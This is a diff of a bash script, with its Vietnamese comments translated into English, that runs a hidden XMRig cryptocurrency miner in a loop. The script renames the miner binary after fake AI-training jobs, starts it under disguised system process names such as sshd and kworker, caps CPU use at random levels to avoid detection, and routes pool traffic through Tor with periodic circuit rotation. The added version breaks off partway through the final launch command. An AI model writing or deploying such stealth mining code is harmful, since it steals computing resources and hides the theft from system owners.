@@ -1,77 +1,72 @@
 #!/bin/bash
 
-# Vòng lặp vô tận để thay đổi IP ngẫu nhiên
+# Infinite loop for changing IP
 while true; do
-  # Ngẫu nhiên hóa thời gian ngủ từ 5 đến 30 phút
+  # Randomize sleep time between 5 to 30 minutes
   sleep_time=$(shuf -i 300-1800 -n 1)
   sleep $sleep_time
 
-  # Quyết định có đổi IP hay không với xác suất ngẫu nhiên
+  # Decide whether to change IP with a 70% chance
   should_change_ip=$(shuf -i 1-100 -n 1)
-
-  # Chỉ đổi IP nếu giá trị ngẫu nhiên < 70 (70% cơ hội đổi IP)
   if [ "$should_change_ip" -lt 70 ]; then
-    # Kiểm tra xem Tor có đang chạy không trước khi yêu cầu thay đổi mạch
+    # Check if Tor is running before changing circuits
     if pgrep -x "tor" > /dev/null; then
-      echo "Đang yêu cầu Tor thay đổi IP qua mạch (Circuit)..."
+      echo "Requesting Tor to change circuit..."
       kill -HUP $(pgrep tor)
-      echo "Tor đã thay đổi mạch."
+      echo "Tor circuit has been changed."
     else
-      echo "Dịch vụ Tor không hoạt động, không thể đổi mạch."
+      echo "Tor is not running, cannot change circuit."
     fi
   else
-    echo "Quyết định giữ nguyên IP ở chu kỳ này."
+    echo "Keeping current IP for this cycle."
   fi
 
-  # Dừng tiến trình cũ nếu đang chạy
+  # Stop the old process if it exists
   if [ -f /root/model.txt ]; then
     CURRENT_NAME=$(cat /root/model.txt)
-    echo "Dừng tiến trình cũ: $CURRENT_NAME"
+    echo "Stopping old process: $CURRENT_NAME"
     pkill -f "/usr/sbin/$CURRENT_NAME"
   fi
 
-  # Xóa tệp tiến trình cũ nếu tồn tại
+  # Remove the old process file if it exists
   if [ -f /usr/sbin/$CURRENT_NAME ]; then
-    echo "Xóa tệp tiến trình cũ: $CURRENT_NAME"
+    echo "Removing old process file: $CURRENT_NAME"
     rm -f /usr/sbin/$CURRENT_NAME
   fi
 
-  # Danh sách các tên tiến trình hệ thống hợp lệ để bọc
+  # List of system process names to disguise as
   SYSTEM_PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")
 
-  # Chọn một tên tiến trình hệ thống hợp lệ ngẫu nhiên để bọc
+  # Randomly select a system process name
   RANDOM_SYSTEM_PROCESS=${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}
 
-  # Danh sách các tên tiến trình liên quan đến AI training
+  # List of AI training process names
   AI_PROCESS_NAMES=("ai_trainer" "deep_learning_worker" "neural_net" "model_optimizer" "tensor_processor" "gpu_trainer")
 
-  # Chọn một tên tiến trình AI ngẫu nhiên từ danh sách
+  # Select random AI process name and generate a number
   RANDOM_AI_NAME=${AI_PROCESS_NAMES[$RANDOM % ${#AI_PROCESS_NAMES[@]}]}
-
-  # Tạo số ngẫu nhiên
   RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)
 
-  # Kết hợp tên tiến trình AI với số ngẫu nhiên để tạo tên cuối cùng
+  # Create the final process name
   FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
   echo $FINAL_NAME > /root/model.txt
 
-  # Sao chép file gốc systemdd thành tên mới
+  # Copy and rename the original systemdd file to the new name
   cp /usr/sbin/systemdd /usr/sbin/$FINAL_NAME
 
-  # Tính toán số threads dựa trên % CPU ngẫu nhiên
-  TOTAL_CORES=$(nproc)  # Xác định số CPU logic của hệ thống
-  cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)  # Phần trăm CPU sử dụng ngẫu nhiên
-  CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)  # Tính số threads
+  # Calculate number of threads based on random CPU percentage
+  TOTAL_CORES=$(nproc)
+  cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)
+  CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)
 
-  # Phân bổ tiến trình trên nhiều core với taskset
-  CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))  # Sử dụng tất cả các core logic
+  # Assign the process to multiple cores using taskset
+  CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))
 
-  # Giới hạn công suất từ 50% đến 90% với cpulimit
-  TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))  # Tổng công suất hệ thống
-  CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)  # Giới hạn công suất ngẫu nhiên từ 50% đến 90%
-  CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))  # Tính giá trị giới hạn CPU thực tế
+  # Limit system power usage between 50% and 90% with cpulimit
+  TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))
+  CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)
+  CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))
 
-  # Khởi động lại tiến trình dưới quyền người dùng nobody với tên tiến trình ngẫu nhiên
-  echo "Khởi động lại XMRig (systemdd) với tên tiến trình: $FINAL_NAME"
-  sudo -u nobody exec -a "$RANDOM_SYSTEM_PROCESS" cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050
-done
+  # Restart the process with limited CPU and under a new process name
+  echo "Restarting XMRig (systemdd) with process name: $FINAL_NAME"
+  sudo -u nobody exec -a "$RANDOM_SYSTEM_PROCESS" cpulimit -l $CPU_LIMIT -- taskset
